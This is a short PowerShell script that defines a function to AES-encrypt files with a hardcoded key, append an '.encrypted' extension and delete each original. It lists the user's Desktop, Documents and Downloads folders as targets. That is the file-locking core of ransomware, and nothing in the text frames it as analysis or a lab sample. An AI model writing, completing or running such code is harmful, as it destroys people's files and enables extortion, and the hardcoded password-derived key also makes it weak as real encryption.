# Encryption with IV preservation
$key = 'hormonereplacementtherapy'
$ext = '.encrypted'
$dirs = 'Desktop,Documents,Downloads'

Add-Type -AssemblyName System.Security

function Encrypt-File($path) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32))
    $aes.GenerateIV()
    
    $encryptor = $aes.CreateEncryptor()
    $fsIn = New-Object System.IO.FileStream $path, 'Open'
    $fsOut = New-Object System.IO.FileStream "$path$ext", 'Create'
    
    # Write IV to beginning of file
    $fsOut.Write($aes.IV, 0, $aes.IV.Length)
    $cs = New-Object System.Security.Cryptography.CryptoStream $fsOut, $encryptor, 'Write'
    $fsIn.CopyTo($cs)
    
    $cs.Close()
    $fsIn.Close()
    Remove-Item $path
}
